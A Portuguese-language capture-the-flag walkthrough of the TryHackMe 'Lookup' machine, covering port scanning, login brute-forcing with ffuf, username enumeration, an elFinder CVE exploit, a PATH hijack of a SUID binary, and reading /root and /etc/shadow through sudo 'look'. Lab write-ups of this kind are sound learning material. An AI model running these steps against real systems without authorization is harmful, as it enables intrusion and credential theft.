# Lookup (Tryhackme)

## Reconhecimento

Um scan inicial com NMAP mostrou apenas 2 portas comuns abertas: **22** e **80**, sendo SSH e HTTP respectivamente.

### Port Scan

```bash
$> nmap -Pn -F [IP]

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As versões dos serviços rodando não apresentam CVEs relevantes para este desafio.

### Domínio

Utilizando `curl [IP] -I` podemos ver que o servidor web redireciona requisições GET para o domínio *lookup.thm*.

```bash
$> curl http://[IP] -I

[...]
Location: http://lookup.thm
```

### Subdomínios

Uma boa ideia em todo início de CTF é enumerar os sudomínios virtuais (*VHOSTS*) da máquina. Mesmo rodando `ffuf` com a wordlist *subdomains-top1million-110000.txt* e 0 erros não obtive nenhum subdomínio.

```bash
ffuf -u http://10.66.143.132 -H "Host: FUZZ.lookup.thm" -w ~/Lists/Subdomain/subdomains-top1million-110000.txt -fs 0
```

É um bom momento para iniciar as investigações na interace web.

# Web

## Login

A página inicial do site se trata de um formulário POST de login para a página `/login.php`. Um teste simples com `username=teste&password=teste` exibe a mensagem de erro padrão para com 74 caracteres.

```HTML
Wrong username or password [...]
```

Testando com o óbvio username *admin* e uma senha qualquer, no entando, obtemos a seguinte resposta de 62 caracteres:

```HTML
Wrong password [...]
```

Esta diferença nas respostas evidencia e coisas:

1. Existe um usuário chamado *admin*, cuja senha não sabemos.

2. É possível enumerar usuários utilizando as mensagens de erro como indicadores, pois o sistema não diria que especificamente a senha está incorreta se o usuário não existisse.

3. A resposta padrão serve para usernames incorretos.

Utilizando *admin* como username, um brute-force com *ffuf* e uma pequena wordlist de senhas comuns revelou a existência da seguinte senha:

```bash
$> ffuf -u http://lookup.thm/login.php -X POST -d "username=admin&password=FUZZ" -w ~/Lists/Passwords/best1050.txt -H "Content-Type: application/x-www-form-urlencoded" -fs 62

password123             [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 137ms]

```

O login com esta senha retornou a resposta de tamanho 74 (*Wrong username or password*), o que evidencia que a senha existe mas não para o username *admin*.

Podemos então enumerar usuários com esta senha encontrada.

```bash
$> ffuf -u http://lookup.thm/login.php -X POST -d "username=FUZZ&password=123" -w ~/Lists/Usernames/usernames.txt -H "Content-Type: application/x-www-form-urlencoded" -fs 74


jose                    [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 128ms]
```

Testando o usuário com a senha, obtemos login no sistema que nos redireciona para *files.lookup.thm*. Portanto adicionaremos este subdomínio para o `/etc/hosts`.

## ElFinder

O sistema que aparece após o login é um gerenciador de arquivos chamado ElFinder, na versão 2.1.47. Uma pesquisa revela que esta versão vulnerável ao *CVE-2019-9194*. Um simples exploit pode nos levar a um shell no sistema.

## Privilege Escalation

### Movimento Lateral

Iniciamos a shell com o usuário *www-data*. Listando os usuários na pasta */home* vemos:

```bash
var/www/files.lookup.thm/public_html/elFinder/php$ ls /home

ssm-user
think
ubuntu
```

Dentro do diretório home do usuário *think* encontra-se o arquivo com a primeira flag:

```bash
<var/www/files.lookup.thm/public_html/elFinder/php$ ls -la /home/think
ls /home/think
-rw-r----- 1 root  think   33 Jul 30  2023 user.txt
-rw-r----- 1 root  think   33 Jul 30  2023 .passwords
```

Precisamos conseguir acesso ao usuário **think** ou **root** para ler estes arquivos.

Procurando por binários com SUID, encontramos:

```bash
$> find / -type f -perm /6000 2>/dev/null
[...]
/usr/sbin/pwm
[...]
```

Um binário muito atípico. Ele usa o comando "id" para saber o UID do usuário atual.

```bash
$> /usr/sbin/pwm

[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[!] File not found: /home/www-data/.passwords
```

Aparentemente ele tenta ler o arquivo .passwords no diretório home do usuário atual. Criei um programa em C que simula o *id*, porém com o usuário *think*:

```c
#include <stdio.h>

int main(){
	printf("uid=1000(think) gid=1000(think) groups=1000(think)");
	return 0;
}
```

Coloquei no diretório atual e utilizei o *export* para colocar o diretório no $PATH:

```bash
$> gcc id.c -o id
$> chmod +x id
$> export PATH=$PWD:$PATH
```

Executando o binário *pwm*, obtemos acesso ao arquivo *.passwords*:

```bash
$> /usr/sbin/pwm

[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171
```



Podemos usar este arquivo como wordlist, mas uma linha parece meio óbvia:

`josemario.AKA(think)`

Esta é de fato a senha por onde podemos logar no usuário *think*:

```bash
su think
Password: josemario.AKA(think)
whoami
think
```

Isto nos permite agora logar por SSH e ler user.txt

### Movimento Vertical

Como *think* temos permissão para ler qualquer arquivo usando o */usr/bin/look*:

```bash
think@ip-10-66-152-160:/home/ubuntu$ sudo -l
[sudo] password for think:
Matching Defaults entries for think on ip-10-66-152-160:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on ip-10-66-152-160:
    (ALL) /usr/bin/look
```

Podemos ler diretamente agora o arquivo de flag root, tradicionalmente localizada em */root/root.txt* e terminar a máquina:

```bash
$> sudo /usr/bin/look '' /root/root.txt
[FLAG]
```



Podemos também ler o arquivo de senhas `/etc/shadow` com `/usr/bin/look '' /etc/shadow` que podemos combinar com o arquivo `/etc/passwd` utilizando `unshadow passwd shadow > source` para quebrar a senha usando o *John The Ripper*.


